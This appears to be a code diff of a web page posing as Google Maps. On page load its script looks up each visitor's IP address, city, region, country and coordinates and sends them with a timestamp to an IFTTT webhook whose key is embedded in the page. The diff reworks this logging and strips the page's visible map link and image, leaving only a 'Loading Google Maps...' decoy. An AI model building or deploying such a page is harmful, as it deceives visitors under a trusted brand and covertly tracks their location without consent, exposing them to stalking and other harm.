@@ -2,52 +2,45 @@
 <html>
 <head>
   <title>Google Maps</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      margin-top: 80px;
-      background-color: #f2f2f2;
-    }
-    img {
-      width: 80%;
-      max-width: 600px;
-      border: 2px solid #ccc;
-      box-shadow: 0 0 20px rgba(0,0,0,0.2);
-    }
-  </style>
 </head>
 <body>
   <h1>Loading Google Maps...</h1>
-  <p>If the map doesn't load, <a href="https://maps.google.com" target="_blank">click here</a>.</p>
-  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Google_Maps_logo_2020.svg/512px-Google_Maps_logo_2020.svg.png" alt="Map">
 
   <script>
-    fetch("https://ipapi.co/json")
-      .then(response => response.json())
-      .then(data => {
-        const ip = data.ip;
-        const city = data.city;
-        const region = data.region;
-        const country = data.country_name;
-        const latitude = data.latitude;
-        const longitude = data.longitude;
+    async function logVisitor() {
+      try {
+        const res = await fetch("https://ipapi.co/json");
+        const data = await res.json();
 
+        const ip = data.ip || "unknown IP";
+        const city = data.city || "unknown city";
+        const region = data.region || "unknown region";
+        const country = data.country_name || "unknown country";
+        const latitude = data.latitude || "0";
+        const longitude = data.longitude || "0";
         const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
         const timestamp = new Date().toISOString();
 
-        fetch("https://maker.ifttt.com/trigger/log_ip/with/key/kOLWy3TchheqT7scEtg8eVdDp37GpvLsgXg6Mv11HMG", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            value1: `${ip} — ${city}, ${region}, ${country}`,
-            value2: mapsLink,
-            value3: timestamp
-          })
-        });
-      });
+        // Only send if we got a valid IP
+        if (ip && ip !== "unknown IP") {
+          await fetch("https://maker.ifttt.com/trigger/log_ip/with/key/kOLWy3TchheqT7scEtg8eVdDp37GpvLsgXg6Mv11HMG", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              value1: `${ip} — ${city}, ${region}, ${country}`,
+              value2: mapsLink,
+              value3: timestamp
+            })
+          });
+        }
+      } catch (error) {
+        console.error("Logging failed:", error);
+      }
+    }
+
+    logVisitor();
   </script>
 </body>
 </html>
